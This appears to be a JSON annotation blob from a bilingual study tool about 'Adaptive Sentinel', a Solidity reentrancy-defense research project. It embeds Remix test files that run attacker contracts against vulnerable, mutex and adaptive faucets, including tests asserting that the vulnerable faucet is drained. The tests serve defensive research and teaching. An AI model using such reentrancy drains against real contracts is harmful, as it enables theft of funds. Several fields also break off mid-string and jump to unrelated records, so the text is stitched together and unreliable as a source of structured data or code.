token movements belong to the risky Ether-payment window.","remove":"Without the snapshot, movesSincePaymentStart cannot isolate current-payment movement.","rename":"beginPayment is user-defined API; msg.sender and require are language constructs.","experiments":"Experiments 2–6","rose":["Why snapshot the counter at the start instead of reset the public counter to zero?","Why require msg.sender == faucet?"],"sources":[{"label":"Adaptive Sentinel research-specific logic","internal":"01_REFERENCE_MATERIALS/01_04_Formal_Research_Proposal.pdf","url":null},{"label":"Code origin map","internal":"06_DOCUMENTATION/06_03_Code_Origin_and_Modification_Map.md","url":null}],"tags":[],"jp":{"title":"beginPayment — 観察window開始","purpose":"登録済みFaucetだけがpaymentActiveをtrueにし、累積transfer countの開始値をsnapshotする。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"研究固有 Adaptive Sentinel","experiments":"Experiments 2–6"}},{"id":"SentinelToken.sol:58-62","start":58,"end":62,"title":"endPayment — close observation window","purpose":"Only the registered Faucet can mark the payment window inactive after a clean payment.","priority":"HIGH","lesson":"Research-specific Adaptive Sentinel","confidence":"確定","origin":"Research-only addition","required":"Required so ordinary transfers outside payout processing are not treated as in-payment movement.","remove":  to the token contract.","priority":"LOW","lesson":"Solidity receive","confidence":"推定","origin":"General Solidity","required":"Not used by the six recorded experiments.","remove":"Removing it would not change the current six test paths unless Ether is directly sent to SentinelToken.","rename":"receive is fixed special function syntax.","experiments":"","rose":[],"sources":[{"label":"Solidity language foundation — exact class meeting not uniquely identified (推定)","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":"https://docs.soliditylang.org/en/v0.8.26/contracts.html"}],"tags":[],"jp":{"title":"receive — Ether受取hook","purpose":"空calldataのEtherを受け取ったときに動くreceive関数。ここでは資金受取またはattacker callbackの入口になる。","required":"主に構文・依存解決・補助確認のために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"Solidity receive","experiments":"—"}}],"role_ja":"PASS token + payment中移動監視 + 学習済み早期防御"},{"group":"tests","name":"attack1_test.sol","code":"// SPDX-License-Identifier: CC-BY-SA-4.0\npragma solidity >=0.8.7 <0.9.0;\n\nimport \"remix_tests.sol\";\nimport \"hardhat/console.sol\";\nimport \"../02_CONTRACTS/SentinelToken.sol\";\nimport \"../02_CONTRACTS/faucet3-vulnerable.sol\";\nimport \"../02_CONTRACTS/Faucet3Mutex.sol\";\nimport \"../02_CONTRACTS/AdaptiveFaucet.sol\";\nimport \"../02_CONTRACTS/attacker.sol\";\n\ncontract Attack1_test {\n    SentinelToken pass;\n    Faucet3 vulnerable;\n    Faucet3Mutex standard;\n    AdaptiveFaucet adaptive;\n    FaucetAttacker vulnerableAttacker;\n    FaucetAttacker standardAttacker;\n    FaucetAttacker adaptiveAttacker;\n\n    receive() external payable {}\n\n    /// #value: 2000000000000000000\n    function beforeAll() public payable {\n        // PASS、三つのFaucet、三つのAttackerを準備する。\n        address[] memory holders = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        holders[0] = address(this);\n        amounts[0] = 3;\n\n        pass = new SentinelToken(holders, amounts);\n        vulnerable = new Faucet3(address(pass));\n        standard = new Faucet3Mutex(address(pass));\n        adaptive = new AdaptiveFaucet(address(pass));\n        pass.setFaucet(address(adaptive));\n\n        vulnerableAttacker = new FaucetAttacker(address(vulnerable));\n        standardAttacker = new FaucetAttacker(address(standard));\n        adaptiveAttacker = new FaucetAttacker(address(adaptive));\n\n        pass.transfer(address(vulnerableAttacker), 1);\n        pass.transfer(address(standardAttacker), 1);\n        pass.transfer(address(adaptiveAttacker), 1);\n\n        require(address(this).balance >= 1.5 ether, \"Test contract not funded\");\n\n        (bool success1, ) = address(vulnerable).call{value: 0.5 ether}(\"\");\n        require(success1, \"Funding failed\");\n\n        (bool success2, ) = address(standard).call{value: 0.5 ether}(\"\");\n        require(success2, \"Funding failed\");\n\n        (bool success3, ) = address(adaptive).call{value: 0.5 ether}(\"\");\n        require(success3, \"Funding failed\");\n    }\n\n    function testVulnerableAttack() public {\n        // 防御なしFaucetへのNormal Reentrancyを確認する。\n        uint victimBalanceBefore = vulnerable.getBalance();\n        uint attackerBalanceBefore = vulnerableAttacker.getBalance();\n\n        vulnerableAttacker.attack();\n\n        uint victimBalanceAfter = vulnerable.getBalance();\n        uint attackerBalanceAfter = vulnerableAttacker.getBalance();\n\n        console.log(\"Victim balance before attack:\", victimBalanceBefore);\n        console.log(\"Attacker balance before attack:\", attackerBalanceBefore);\n        console.log(\"Victim balance after attack:\", victimBalanceAfter);\n        console.log(\"Attacker balance after attack:\", attackerBalanceAfter);\n\n        Assert.ok(\n            attackerBalanceAfter > attackerBalanceBefore,\n            \"Attacker balance should increase after attack\"\n        );\n\n        Assert.equal(\n            victimBalanceAfter,\n            uint(0),\n            \"Victim faucet should be drained\"\n        );\n    }\n\n    function testStandardDefense() public {\n        // CEIとmutexでNormal Reentrancyを防ぐ。\n        uint victimBalanceBefore = standard.getBalance();\n        uint attackerBalanceBefore = standardAttacker.getBalance();\n\n        standardAttacker.attack();\n\n        uint victimBalanceAfter = standard.getBalance();\n        uint attackerBalanceAfter = standardAttacker.getBalance();\n\n        console.log(\"Standard defense - victim before:\", victimBalanceBefore);\n        console.log(\"Standard defense - attacker before:\", attackerBalanceBefore);\n        console.log(\"Standard defense - victim after:\", victimBalanceAfter);\n        console.log(\"Standard defense - attacker after:\", attackerBalanceAfter);\n\n        Assert.equal(\n            attackerBalanceAfter - attackerBalanceBefore,\n            uint(0.1 ether),\n            \"Attacker should receive one payout\"\n        );\n\n        Assert.equal(\n            victimBalanceAfter,\n            victimBalanceBefore - 0.1 ether,\n            \"Faucet should lose one payout\"\n        );\n    }\n\n    function testAdaptiveDefense() public {\n        // Adaptive FaucetのLayer 1でNormal Reentrancyを防ぐ。\n        uint victimBalanceBefore = adaptive.getBalance();\n        uint attackerBalanceBefore = adaptiveAttacker.getBalance();\n\n        adaptiveAttacker.attack();\n\n        uint victimBalanceAfter = adaptive.getBalance();\n        uint attackerBalanceAfter = adaptiveAttacker.getBalance();\n\n        console.log(\"Adaptive defense - victim before:\", victimBalanceBefore);\n        console.log(\"Adaptive defense - attacker before:\", attackerBalanceBefore);\n        console.log(\"Adaptive defense - victim after:\", victimBalanceAfter);\n        console.log(\"Adaptive defense - attacker after:\", attackerBalanceAfter);\n        console.log(\"Adaptive defense - total trips:\", adaptive.totalTrips());\n\n        Assert.equal(\n            attackerBalanceAfter - attackerBalanceBefore,\n            uint(0.1 ether),\n            \"Attacker should receive one payout\"\n        );\n\n        Assert.equal(\n            victimBalanceAfter,\n            victimBalanceBefore - 0.1 ether,\n            \"Faucet should lose one payout\"\n        );\n\n        Assert.equal(\n            adaptive.totalTrips(),\n            uint(0),\n            \"Tripwire should not activate\"\n        );\n    }\n}\n","role":"Experiment 1: normal reentrancy baseline","priority":"MEDIUM","lesson":"Course test pattern + research comparison","blocks":[{"id":"attack1_test.sol:1-10","start":1,"end":10,"title":"Test header + imports","purpose":"Loads Remix assertions, terminal logging, all three Faucet variants and FaucetAttacker for the baseline comparison.","priority":"MEDIUM","lesson":"Remix Solidity Unit Testing / course tests","confidence":"確定","origin":"Course testing pattern + experiment imports","required":"Imports are required by the test file references; compiler metadata is required as usual.","remove":"Removing a used import causes unresolved symbols or missing console/assert support.","rename":"File paths are literals; imported contract names must match source declarations.","experiments":"","rose":[],"sources":[{"label":"Remix Solidity Unit Testing — course pattern + official docs","internal":"tests/260620_attacker_test/attack1_test.sol","url":"https://remix-ide.readthedocs.io/en/latest/unittesting.html"},{"label":"Hardhat console.log in Remix — external tool documentation","internal":null,"url":"https://remix-ide.readthedocs.io/en/latest/hardhat.html"}],"tags":[],"jp":{"title":"テストヘッダー + import","purpose":"コンパイラ条件と、このファイルが依存するcontract/interfaceを読み込むための冒頭部分。通常コメントとconsole出力はStudy Viewでは非表示。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更 xt","url":null}],"tags":[],"jp":{"title":"Standard Defense baselineテスト","purpose":"このまとまり全体で「Standard Defense baselineテスト」という一つの役割を達成する。日本語モードでは学習用要約、Englishモードでは元の詳細説明を表示する。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"授業 reentrancy defense + Remix tests","experiments":"Experiment 1"}},{"id":"attack1_test.sol:112-145","start":112,"end":145,"title":"Test Adaptive Layer 1 baseline","purpose":"Runs normal reentrancy against Adaptive Faucet and verifies one payout plus zero Tripwire activations.","priority":"HIGH","lesson":"Research control condition","confidence":"確定","origin":"Research experiment","required":"`totalTrips == 0` separates Layer 1 success from Layer 2 activation.","remove":"Without the trip assertion, the test would not prove that normal reentrancy was handled without the adaptive path.","rename":"Assertions/log names are test design choices.","experiments":"Experiment 1","rose":["Why is `totalTrips == 0` a positive result here?","What would totalTrips=1 imply about the intended layering?"],"sources":[{"label":"Remix Solidity Unit Testing — course pattern + official docs","internal":"tests/260620_attacker_test/attack1_test.sol","url":"https://remix-ide.readthedocs.io/en/latest/unittesting.html"},{"label":"Adaptive Sentinel research-specific logic","internal":"01_REFERENCE_MATERIALS/01_04_Formal_Research_Proposal.pdf","url":null},{"label":"Code origin map","internal":"06_DOCUMENTATION/06_03_Code_Origin_and_Modification_Map.md","url":null},{"label":"Reentrancy / mutex lab around 2026-06-20 — high confidence","internal":"tests/contracts/260620_faucet/ + tests/contracts/260620_attacker/","url":null},{"label":"Class transcript — reentrancy, CEI, mutex discussion","internal":"01_REFERENCE_MATERIALS/01_05_Class_Transcript.txt","url":null}],"tags":[],"jp":{"title":"Adaptive Layer 1 baselineテスト","purpose":"このまとまり全体で「Adaptive Layer 1 baselineテスト」という一つの役割を達成する。日本語モードでは学習用要約、Englishモードでは元の詳細説明を表示する。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"Research control condition","experiments":"Experiment 1"}}],"role_ja":"Experiment 1: Normal Reentrancy baseline"},{"group":"tests","name":"attack2_test.sol","code":"// SPDX-License-Identifier: CC-BY-SA-4.0\npragma solidity >=0.8.7 <0.9.0;\n\nimport \"remix_tests.sol\";\nimport \"hardhat/console.sol\";\nimport \"../02_CONTRACTS/SentinelToken.sol\";\nimport \"../02_CONTRACTS/faucet3-vulnerable.sol\";\nimport \"../02_CONTRACTS/Faucet3Mutex.sol\";\nimport \"../02_CONTRACTS/AdaptiveFaucet.sol\";\nimport \"../02_CONTRACTS/Accomplice.sol\";\nimport \"../02_CONTRACTS/attacker.sol\";\n\ncontract Attack2_test {\n    receive() external payable {}\n\n    /// #value: 2000000000000000000\n    function beforeAll() public payable {\n        // 実験用Etherを準備する。\n        require(address(this).balance >= 1.5 ether, \"Test contract not funded\");\n    }\n\n    function testVulnerableTokenMove() public {\n        // Vulnerable FaucetでPASS移動後の二回目withdrawを確認する。\n        address[] memory holders = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        holders[0] = address(this);\n        amounts[0] = 1;\n\n        SentinelToken pass = new SentinelToken(holders, amounts);\n        Faucet3 faucet = new Faucet3(address(pass));\n        Accomplice accomplice = new Accomplice(address(faucet), address(pass));\n        TokenMoveAttacker attacker =\n            new TokenMoveAttacker(address(faucet), address(pass), address(accomplice));\n\n        (bool success, ) = address(faucet).call{value: 0.5 ether}(\"\");\n        require(success, \"Funding failed\");\n\n        pass.transfer(address(attacker), 1);\n\n        console.log(\"Vulnerable token move - faucet before:\", faucet.getBalance());\n        console.log(\"Vulnerable token move - attacker before:\", attacker.getBalance());\n\n        attacker.attack();\n\n        console.log(\"Vulnerable token move - faucet after first payout:\", faucet.getBalance());\n        console.log(\"Vulnerable token move - attacker after first payout:\", attacker.getBalance());\n        console.log(\"Vulnerable token move - accomplice PASS after move:\", pass.balances(address(accomplice)));\n\n        Assert.equal(attacker.getBalance(), uint(0.1 ether), \"First payout should complete\");\n        Assert.equal(pass.balances(address(accomplice)), uint(1), \"PASS should move to accomplice\");\n\n        accomplice.claim();\n\n        console.log(\"Vulnerable token move - accomplice payout:\", accomplice.getBalance());\n        console.log(\"Vulnerable token move - faucet final:\", faucet.getBalance());\n\n        Assert.equal(accomplice.getBalance(), uint(0.1 ether), \"Accomplice should receive payout\");\n        Assert.equal(faucet.getBalance(), uint(0.3 ether), \"Two payouts should leave faucet\");\n    }\n\n    function testStandardTokenMove() public {\n        // Mutex Faucetでも別contractへのPASS移動が残ることを確認する。\n        address[] memory holders = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        holders[0] = address(this);\n        amounts[0] = 1;\n\n        SentinelToken pass = new SentinelToken(holders, amounts);\n        Faucet3Mutex faucet = new Faucet3Mutex(address(pass));\n        Accomplice accomplice = new Accomplice(address(faucet), address(pass));\n        TokenMoveAttacker attacker =\n            new TokenMoveAttacker(address(faucet), address(pass), address(accomplice));\n\n        (bool success, ) = address(faucet).call{value: 0.5 ether}(\"\");\n        require(success, \"Funding failed\");\n\n        pass.transfer(address(attacker), 1);\n\n        console.log(\"Mutex token move - faucet before:\", faucet.getBalance());\n        console.log(\"Mutex token move - attacker before:\", attacker.getBalance());\n\n        attacker.attack();\n\n        console.log(\"Mutex token move - faucet after first payout:\", faucet.getBalance());\n        console.log(\"Mutex token move - attacker after first payout:\", attacker.getBalance());\n        console.log(\"Mutex token move - accomplice PASS after move:\", pass.balances(address(accomplice)));\n\n        Assert.equal(attacker.getBalance(), uint(0.1 ether), \"First payout should complete\");\n        Assert.equal(pass.balances(address(accomplice)), uint(1), \"PASS should move to accomplice\");\n\n        accomplice.claim();\n\n        console.log(\"Mutex token move - accomplice payout:\", accomplice.getBalance());\n        console.log(\"Mutex token move - faucet final:\", faucet.getBalance());\n\n        Assert.equal(accomplice.getBalance(), uint(0.1 ether), \"Accomplice should receive payout\");\n        Assert.equal(faucet.getBalance(), uint(0.3 ether), \"Two payouts should leave faucet\");\n    }\n\n    function testAdaptiveTokenMove() public {\n        // Adaptive Faucetで支払い中のPASS移動を検知して戻す。\n        address[] memory holders = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        holders[0] = address(this);\n        amounts[0] = 1;\n\n        SentinelToken pass = new SentinelToken(holders, amounts);\n        AdaptiveFaucet faucet = new AdaptiveFaucet(address(pass));\n        pass.setFaucet(address(faucet));\n\n        Accomplice accomplice = new Accomplice(address(faucet), address(pass));\n        TokenMoveAttacker attacker =\n            new TokenMoveAttacker(address(faucet), address(pass), address(accomplice));\n\n        (bool success, ) = address(faucet).call{value: 0.5 ether}(\"\");\n        require(success, \"Funding failed\");\n\n        pass.transfer(address(attacker), 1);\n\n        console.log(\"Adaptive token move - faucet before:\", faucet.getBalance());\n        console.log(\"Adaptive token move - attacker before:\", attacker.getBalance());\n        console.log(\"Adaptive token move - attacker PASS before:\", pass.balances(address(attacker)));\n\n        attacker.attack();\n\n        console.log(\"Adaptive token move - faucet after:\", faucet.getBalance());\n        console.log(\"Adaptive token move - attacker after:\", attacker.getBalance());\n        console.log(\"Adaptive token move - attacker PASS after:\", pass.balances(address(attacker)));\n        console.log(\"Adaptive token move - accomplice PASS after:\", pass.balances(address(accomplice)));\n        console.log(\"Adaptive token move - total trips:\", faucet.totalTrips());\n        console.log(\"Adaptive token move - restriction active:\", pass.adaptiveRestriction());\n\n        Assert.equal(attacker.getBalance(), uint(0), \"Attacker should keep no Ether\");\n        Assert.equal(faucet.getBalance(), uint(0.5 ether), \"Faucet balance should be restored\");\n        Assert.equal(pass.balances(address(attacker)), uint(1), \"PASS should return to attacker state\");\n        Assert.equal(pass.balances(address(accomplice)), uint(0), \"Accomplice should keep no PASS\");\n        Assert.equal(faucet.totalTrips(), uint(1), \"Tripwire should activate once\");\n        Assert.ok(pass.adaptiveRestriction(), \"Adaptive restriction should be enabled\");\n    }\n}\n","role":"Experiment 2: cross-contract token movement","priority":"HIGH","lesson":"L12 blind spot + research comparison","blocks":[{"id":"attack2_test.sol:1-11","start":1,"end":11,"title":"Test header + imports","purpose":"Loads Remix/console plus all contracts needed for cross-contract PASS movement comparison.","priority":"MEDIUM","lesson":"Remix Solidity Unit Testing / course tests","confidence":"確定","origin":"Course testing pattern + experiment imports","required":"Imports are required by the test file references; compiler metadata is required as usual.","remove":"Removing a used import causes unresolved symbols or missing console/assert support.","rename":"File paths are literals; imported co l":"https://remix-ide.readthedocs.io/en/latest/unittesting.html"}],"tags":[],"jp":{"title":"Adaptive Type 2検知証拠","purpose":"攻撃/防御後の残高・PASS位置・trip/prevention状態を確認し、実験結果を検証するブロック。Study Viewではconsole.log自体は隠している。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"Research observe → revert → remember → adapt","experiments":"Experiment 2"}}],"role_ja":"Experiment 2: Cross-Contract Token Movement"},{"group":"tests","name":"attack3_test.sol","code":"// SPDX-License-Identifier: CC-BY-SA-4.0\npragma solidity >=0.8.7 <0.9.0;\n\nimport \"remix_tests.sol\";\nimport \"hardhat/console.sol\";\nimport \"../02_CONTRACTS/SentinelToken.sol\";\nimport \"../02_CONTRACTS/AdaptiveFaucet.sol\";\nimport \"../02_CONTRACTS/Accomplice.sol\";\nimport \"../02_CONTRACTS/attacker.sol\";\n\ncontract Attack3_test {\n    receive() external payable {}\n\n    /// #value: 2000000000000000000\n    function beforeAll() public payable {\n        // 実験用Etherを準備する。\n        require(address(this).balance >= 1 ether, \"Test contract not funded\");\n    }\n\n    function testLearningAndEarlyPrevention() public {\n        // 一回目で学習し、二回目の同じPASS移動を早期に止める。\n        address[] memory holders = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        holders[0] = address(this);\n        amounts[0] = 2;\n\n        SentinelToken pass = new SentinelToken(holders, amounts);\n        AdaptiveFaucet faucet = new AdaptiveFaucet(address(pass));\n        pass.setFaucet(address(faucet));\n\n        Accomplice accomplice = new Accomplice(address(faucet), address(pass));\n        TokenMoveAttacker firstAttacker =\n            new TokenMoveAttacker(address(faucet), address(pass), address(accomplice));\n        TokenMoveAttacker secondAttacker =\n            new TokenMoveAttacker(address(faucet), address(pass), address(accomplice));\n\n        (bool success, ) = address(faucet).call{value: 1 ether}(\"\");\n        require(success, \"Funding failed\");\n\n        pass.transfer(address(firstAttacker), 1);\n        pass.transfer(address(secondAttacker), 1);\n\n        console.log(\"Learning test - faucet before first attack:\", faucet.getBalance());\n        console.log(\"Learning test - total trips before:\", faucet.totalTrips());\n        console.log(\"Learning test - threat count before:\", faucet.threatCount());\n\n        firstAttacker.attack();\n\n        console.log(\"Learning test - first attacker Ether after:\", firstAttacker.getBalance());\n        console.log(\"Learning test - faucet after first attack:\", faucet.getBalance());\n        console.log(\"Learning test - total trips after first attack:\", faucet.totalTrips());\n        console.log(\"Learning test - threat count after first attack:\", faucet.threatCount());\n        console.log(\"Learning test - learned PASS movement:\", faucet.learnedPassMove());\n        console.log(\"Learning test - first attacker banned:\", faucet.banned(address(firstAttacker)));\n\n        Assert.equal(firstAttacker.getBalance(), uint(0), \"First attack should keep no Ether\");\n        Assert.equal(faucet.totalTrips(), uint(1), \"First attack should trip once\");\n        Assert.equal(faucet.threatCount(), uint(1), \"Threat should be remembered\");\n        Assert.ok(faucet.learnedPassMove(), \"PASS movement should be learned\");\n        Assert.ok(faucet.banned(address(firstAttacker)), \"First attacker should be banned\");\n\n        secondAttacker.attack();\n\n        console.log(\"Early prevention - second attacker Ether after:\", secondAttacker.getBalance());\n        console.log(\"Early prevention - faucet after second attack:\", faucet.getBalance());\n        console.log(\"Early prevention - PASS move blocked:\", secondAttacker.passMoveBlocked());\n        console.log(\"Early prevention - prevention count:\", pass.earlyPreventions());\n        console.log(\"Early prevention - total trips remains:\", faucet.totalTrips());\n        console.log(\"Early prevention - second attacker PASS:\", pass.balances(address(secondAttacker)));\n        console.log(\"Early prevention - accomplice PASS:\", pass.balances(address(accomplice)));\n\n        Assert.ok(secondAttacker.passMoveBlocked(), \"Second PASS movement should be blocked\");\n        Assert.equal(pass.earlyPreventions(), uint(1), \"Early prevention should be counted\");\n        Assert.equal(faucet.totalTrips(), uint(1), \"No second late trip should occur\");\n        Assert.equal(secondAttacker.getBalance(), uint(0.1 ether), \"One payout should complete\");\n        Assert.equal(pass.balances(address(secondAttacker)), uint(1), \"PASS should stay with second attacker\");\n        Assert.equal(pass.balances(address(accomplice)), uint(0), \"Accomplice should receive no PASS\");\n    }\n}\n","role":"Experiment 3: late detection → early prevention","priority":"HIGH","lesson":"Core research experiment","blocks":[{"id":"attack3_test.sol:1-9","start":1,"end":9,"title":"Test header + imports","purpose":"Loads Adaptive Sentinel, Accomplice and token-movement attacker for learning/early-prevention testing.","priority":"MEDIUM","lesson":"Remix Solidity Unit Testing / course tests","confidence":"確定","origin":"Course testing pattern + experiment imports","required":"Imports are required by the test file references; compiler metadata is required as usual.","remove":"Removing a used import causes unresolved symbols or missing console/assert support.","rename":"File paths are literals; imported contract names must match source declarations.","experiments":"","rose":[],"sources":[{"label":"Remix Solidity Unit Testing — course pattern + official docs","internal":"tests/260620_attacker_test/attack1_test.sol","url":"https://remix-ide.readthedocs.io/en/latest/unittesting.html"},{"label":"Hardhat console.log in Remix — external tool documentation","internal":null,"url":"https://remix-ide.readthedocs.i no second late trip occurred, normal payout completed, and PASS never reached Accomplice.","priority":"HIGH","lesson":"Research adapt phase","confidence":"確定","origin":"Core research evidence","required":"Required for the current block behavior.","remove":"Removing it changes or breaks the behavior described here.","rename":"Names are user-defined unless the inspector marks a Solidity/framework keyword.","experiments":"Experiment 3","rose":["Why is secondAttacker balance 0.1 ETH if the attack was prevented?","Why must totalTrips remain exactly 1?","Why does this demonstrate behavior-level generalization rather than only banning one address?"],"sources":[{"label":"Adaptive Sentinel research-specific logic","internal":"01_REFERENCE_MATERIALS/01_04_Formal_Research_Proposal.pdf","url":null},{"label":"Code origin map","internal":"06_DOCUMENTATION/06_03_Code_Origin_and_Modification_Map.md","url":null},{"label":"Remix Solidity Unit Testing — course pattern + official docs","internal":"tests/260620_attacker_test/attack1_test.sol","url":"https://remix-ide.readthedocs.io/en/latest/unittesting.html"}],"tags":[],"jp":{"title":"Early Prevention検証","purpose":"実行後の状態が研究上の期待値と一致するかをAssertで機械的に確認するブロック。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"Research adapt phase","experiments":"Experiment 3"}}],"role_ja":"Experiment 3: Learning → Early Prevention"},{"group":"tests","name":"attack4_test.sol","code":"// SPDX-License-Identifier: CC-BY-SA-4.0\npragma solidity >=0.8.7 <0.9.0;\n\nimport \"remix_tests.sol\";\nimport \"hardhat/console.sol\";\nimport \"../02_CONTRACTS/SentinelToken.sol\";\nimport \"../02_CONTRACTS/AdaptiveFaucet.sol\";\nimport \"../02_CONTRACTS/Accomplice.sol\";\nimport \"../02_CONTRACTS/attacker.sol\";\n\ncontract Attack4_test {\n    receive() external payable {}\n\n    /// #value: 2000000000000000000\n    function beforeAll() public payable {\n        // 実験用Etherを準備する。\n        require(address(this).balance >= 1 ether, \"Test contract not funded\");\n    }\n\n    function testNormalUserAfterLearning() public {\n        // 学習後でも通常のPASS holderがwithdrawできることを確認する。\n        address[] memory holders = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        holders[0] = address(this);\n        amounts[0] = 2;\n\n        SentinelToken pass = new SentinelToken(holders, amounts);\n        AdaptiveFaucet faucet = new AdaptiveFaucet(address(pass));\n        pass.setFaucet(address(faucet));\n\n        Accomplice accomplice = new Accomplice(address(faucet), address(pass));\n        TokenMoveAttacker attacker =\n            new TokenMoveAttacker(address(faucet), address(pass), address(accomplice));\n\n        (bool success, ) = address(faucet).call{value: 1 ether}(\"\");\n        require(success, \"Funding failed\");\n\n        pass.transfer(address(attacker), 1);\n        attacker.attack();\n\n        console.log(\"False-positive test - trips after learning attack:\", faucet.totalTrips());\n        console.log(\"False-positive test - restriction active:\", pass.adaptiveRestriction());\n        console.log(\"False-positive test - faucet before normal user:\", faucet.getBalance());\n\n        uint balanceBefore = address(this).balance;\n        faucet.withdraw(0.1 ether);\n        uint balanceAfter = address(this).balance;\n\n        console.log(\"False-positive test - normal user balance before:\", balanceBefore);\n        console.log(\"False-positive test - normal user balance after:\", balanceAfter);\n        console.log(\"False-positive test - normal user gain:\", balanceAfter - balanceBefore);\n        console.log(\"False-positive test - faucet after normal user:\", faucet.getBalance());\n        console.log(\"False-positive test - normal user banned:\", faucet.banned(address(this)));\n        console.log(\"False-positive test - total trips final:\", faucet.totalTrips());\n        console.log(\"False-positive test - early preventions:\", pass.earlyPreventions());\n\n        Assert.ok(pass.adaptiveRestriction(), \"Restriction should be learned\");\n        Assert.equal(balanceAfter - balanceBefore, uint(0.1 ether), \"Normal user should receive payout\");\n        Assert.ok(!faucet.banned(address(this)), \"Normal user should not be banned\");\n        Assert.equal(faucet.totalTrips(), uint(1), \"Normal user should create no new trip\");\n        Assert.equal(pass.earlyPreventions(), uint(0), \"Normal user should create no early prevention\");\n    }\n}\n","role":"Experiment 4: false-positive / legitimate-user check","priority":"MEDIUM","lesson":"Research specificity experiment","blocks":[{"id":"attack4_test.sol:1-9","start":1,"end":9,"title":"Test header + imports","purpose":"Loads Adaptive Sentinel components for the false-positive test.","priority":"MEDIUM","lesson":"Remix Solidity Unit Testing / course tests","confidence":"確定","origin":"Course testing pattern + experiment imports","required":"Imports are required by the test file references; compiler metadata is required as usual.","remove":"Removing a used import causes unresolved symbols or missing console/assert support.","rename":"File paths are literals; imported contract names must match source declarations.","experiments":"","rose":[],"sources":[{"label":"Remix Solidity Unit Testing — course pattern + official docs","internal":"tests/260620_attacker_test/attack1_test.sol","url":"https://remix-ide.readthedocs.io/en/latest/unittesting.html"},{"label":"Hardhat console.log in Remix — external tool documentation","internal":null,"url":"https://remix-ide.readthedocs.io/en/latest/hardhat.html"}],"tags":[],"jp":{"title":"テストヘッダー + import","purpose":"コンパイラ条件と、このファイルが依存するcontract/interfaceを読み込むための冒頭部分。通常コメントとconsole出力はStudy Viewでは非表示。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。", e, trip count and early-prevention count.","priority":"MEDIUM","lesson":"Research evidence capture","confidence":"確定","origin":"Research experiment + console evidence","required":"Required for the current block behavior.","remove":"Removing it changes or breaks the behavior described here.","rename":"Names are user-defined unless the inspector marks a Solidity/framework keyword.","experiments":"Experiment 4","rose":[],"sources":[{"label":"Adaptive Sentinel research-specific logic","internal":"01_REFERENCE_MATERIALS/01_04_Formal_Research_Proposal.pdf","url":null},{"label":"Code origin map","internal":"06_DOCUMENTATION/06_03_Code_Origin_and_Modification_Map.md","url":null},{"label":"Hardhat console.log in Remix — external tool documentation","internal":null,"url":"https://remix-ide.readthedocs.io/en/latest/hardhat.html"}],"tags":[],"jp":{"title":"withdraw後の証拠","purpose":"攻撃/防御後の残高・PASS位置・trip/prevention状態を確認し、実験結果を検証するブロック。Study Viewではconsole.log自体は隠している。","required":"現在の実験・挙動でこのブロックが担当する役割を成立させるために必要。","remove":"削除・順序変更すると、コンパイル、依存解決、またはこのブロックが担当する挙動/検証のどれかが崩れる。具体的な影響はEnglish原文も併記。","rename":"Solidity/frameworkの固定語は変更不可。ユーザー定義名は参照箇所をすべて同時に変更すれば変更可能。","lesson":"Research evidence capture","experiments":"Experiment 4"}},{"id":"attack4_test.sol:57-62","start":57,"end":62,"title":"False-positive assertions","purpose":"Requires learned restriction to remain active while normal payout succeeds with no ban, new trip, or prevention event.","priority":"HIGH","lesson":"Research specificity conclusion","confidence":"確定","origin":"Core research evidence","required":"Required for the current block behavior.","remove":"Removing it changes or breaks the behavior described here.","rename":"Names are user-defined unless the inspector marks a Solidity/framework keyword.","experiments":"Experiment 4","rose":["Why should earlyPreventions stay zero for a normal claim?","How can restrictionActive be true without blocking the user?"],"sources":[{"label":"Adaptive Sentinel research-specific logic","internal":"01_REFERENCE_MATERIALS/01_04_Formal_Research_Proposal.pdf","url":null},{"label":"Code origin map","internal":"06_DOCUMENTATION/06_03_Code_Origin_and_Modification_Map.md","url":null},{"label":"Remix Solidity Unit Testing — course pattern + official 